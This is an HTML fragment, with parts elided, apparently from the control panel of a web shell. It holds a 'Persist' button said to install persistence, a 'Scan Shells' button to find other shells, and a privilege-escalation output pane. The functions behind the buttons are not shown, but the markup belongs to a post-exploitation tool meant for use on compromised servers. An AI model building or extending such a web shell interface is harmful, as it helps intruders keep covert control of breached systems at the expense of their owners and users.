    ...
    <div class="modal-content" style="max-width: 900px; width: 90vw; max-height: 85vh;">
        ...
        <div style="padding: 10px 15px;">
            ...
            <div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap;">
                <button onclick="installPersistence()" style="flex:1;min-width:120px;background:#f80;color:#111;font-weight:bold;padding:10px;font-size:14px;border:none;border-radius:4px;cursor:pointer;">🔒 Persist</button>
                <button onclick="scanOtherShells()" style="flex:1;min-width:120px;background:#f44;color:#fff;font-weight:bold;padding:10px;font-size:14px;border:none;border-radius:4px;cursor:pointer;">🕵️ Scan Shells</button>
            </div>
            ...
            <div id="privescOutput" style="height:200px;overflow-y:auto;background:#000;border:1px solid #333;border-radius:4px;padding:8px;font-family:monospace;font-size:11px;white-space:pre-wrap;">
                <div style="text-align:center;padding:20px;color:#666;">
                    ...
                    <p style="margin:5px 0;font-size:11px;">Click 🔒 Persist to install persistence or 🕵️ Scan Shells to find other shells</p>
                </div>
            </div>
